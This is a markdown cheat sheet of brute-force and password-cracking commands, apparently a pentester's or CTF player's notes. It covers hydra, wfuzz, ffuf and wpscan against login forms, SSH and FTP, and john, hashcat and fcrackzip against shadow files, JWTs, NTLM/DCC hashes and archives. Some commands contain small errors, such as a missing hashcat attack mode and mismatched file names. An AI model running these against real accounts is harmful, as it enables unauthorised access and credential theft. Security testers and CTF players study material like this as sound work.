---
title: 3 - Brute Force
---

# Words Lists :

---

* <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>
* <font color=lightblue>/usr/share/wordlists/seclists/Passwords/Common-Credentials/best1050.txt</font>
* <font color=lightblue>/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt</font>
* <font color=lightblue>/usr/share/wordlists/metasploit/unix_passwords.txt</font>

# HTTP POST Login Page

---

### WFUZZ


 > 
 > **<font color=red>wfuzz -c -z file,</font>myWordList -u http://\[TARGET_IP\]:\[TARGET_PORT\]/login.php -d “username=<font color=red>FUZZ</font>&password=<font color=red>FUZZ</font>”</br>**
 > Fuzz Login.

---

### HYDRA


 > 
 > **<font color=red>hydra -vV -L</font> myUsersFile.txt  <font color=red>-P</font> /usr/share/wordlists/rockyou.txt  \[TARGET_IP\] <font color=red>http-post-form ‘</font>/path/to/form.php<font color=red>:</font>username<font color=red>=^USER^&</font>password<font color=red>=^PASS^&</font>login=Login:<font color=red>F=</font>ChainNotOK<font color=red>’</font>**</br>
 > Brute Force HTTP POST form with valid username.

---

### FUFF

WPSCAN> **<font color=red>ffuf -w </font>myUsersFile.txt<font color=red>:W1,</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font><font color=red>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u</font> http://\[TARGET_IP\]/login <font color=red>-fc 200</font>**</br>

 > 
 > Brute Force HTTP POST form with valid username.

---

### WPSCAN (WordPress)


 > 
 > **<font color=red>wpscan --url </font>http://\[TARGET_IP\]/blog <font color=red>--usernames</font> admin <font color=red>--passwords</font> <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
 > Brute force WordPress user's credentials.

# HTTP Basic Access Auth

---

### HYDRA


 > 
 > **<font color=red>hydra -vV -l </font>myUser <font color=red>-P</font> /usr/share/wordlists/rockyou.txt \[TARGET_IP\]<font color=red>http-get</font> /path/**</br>
 > Brute Force HTTP Basic Access Authentication.

# SSH

---

### HYDRA


 > 
 > **<font color=red>hydra -L</font> myUsersFile <font color=red>-P</font> myPassFile \[TARGET_IP\]<font color=red>ssh</font>**</br>
 > Brute Force SSH.

# SSH Private Key Passphrase

---

### JOHN


 > 
 > **<font color=red>/usr/share/john/ssh2john.py</font> private_key <font color=red>\></font> forjohn.txt**</br>
 > Prepare private key for John.
 > 
 > **<font color=red>john --wordlist=</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font> forjohn.txt**</br>
 > Crack private key passphrase.

# FTP

---

### HYDRA


 > 
 > **<font color=red>hydra -vV -l </font>myUser <font color=red>-P </font>/usr/share/wordlists/rockyou.txt  \[TARGET_IP\] <font color=red>ftp</font>**</br>
 > Brute Force FTP Login.

# Linux Unshadow

---

### JOHN


 > 
 > **<font color=red>unshadow /etc/passwd /etc/shadow ></font> unshadowd.txt**</br>
 > Prepare passwd and shadow file for John.
 > 
 > **<font color=red>john unshadow.txt --wordlist=</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
 > Crack user passwords.
 > 
 > **<font color=red>john --show</font> unshadow.txt**</br> 
 > Display cracked passwords.

# JWT

---

### JOHN


 > 
 > **<font color=red>john --format=HMAC-SHA512</font> jwt.txt <font color=red>--show</font>**</br>
 > Crack JWT secret.

### JWT-CRACKER


 > 
 > **<font color=red>jwt-cracker </font> \[myToken\] \[myAlphabet\] \[myMaxSecretLengthExpected\]**</br>
 > Crack JWT token password.

Default Alphabet : abcdefghijklmnopqrstuvwxyz

# MD5

---

### JOHN


 > 
 > **<font color=red>john --format=md5crypt --wordlist=</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font> hash.txt**</br>
 > Crack MD5 hash.

# NTLM

---

### JOHN


 > 
 > **<font color=red>john --format=NT -w=</font><font color=lightblue>/usr/share/wordlists/rockyou.txt</font> hash.txt <font color=red>--pot=</font>output.txt**</br>
 > Crack NTLM Hash.

# DCC

---

### HASHCAT


 > 
 > **<font color=red>hashcat -a 0 -m 1100 0 '</font>15a57c379ebdfea572ad1ff91eb6ef0c:Administrator<font color=red>'</font> <font color=lightblue>/usr/share/wordlists/rockyou.txt</font>**</br>
 > Crack DCC (Domain Cached Credentials) hash.

# ZIP

---

### JOHN


 > 
 > **<font color=red>zip2john</font> myFile.zip <font color=red>\></font> forjohn.txt**</br>
 > Prepare ZIP archive for John.

 > 
 > **<font color=red>john</font> forjohn.txt**</br>
 > Crack ZIP archive password.

---

### HASHCAT


 > 
 > **<font color=red>zip2john</font> myFile.zip <font color=red>\></font> forhashcat.txt**</br>
 > Remove name of the file and archive from the hash (at the beginning and the end).

 > 
 > **<font color=red>hashcat -a -m 13600</font> forhashcat.txt <font color=lightblue>/usr/share/wordslist/rockyou.txt</font>**</br>
 > Crack ZIP archive password.

---

### FCRACKZIP


 > 
 > **<font color=red>fcrackzip -v -D -p</font> <font color=lightblue>/usr/share/wordlists/rockyou.txt</font> <font color=red>-u </font>myZipFile.zip**</br>
 > Crack ZIP archive password.

# RAR

---

## JOHN


 > 
 > **<font color=red>rar2john</font> myFile.rar <font color=red>\></font> forjohn.txt**</br>
 > Prepare RAR archive for John.
 > 
 > **<font color=red>john</font> forjohn.txt**</br>
 > Crack RAR archive password.
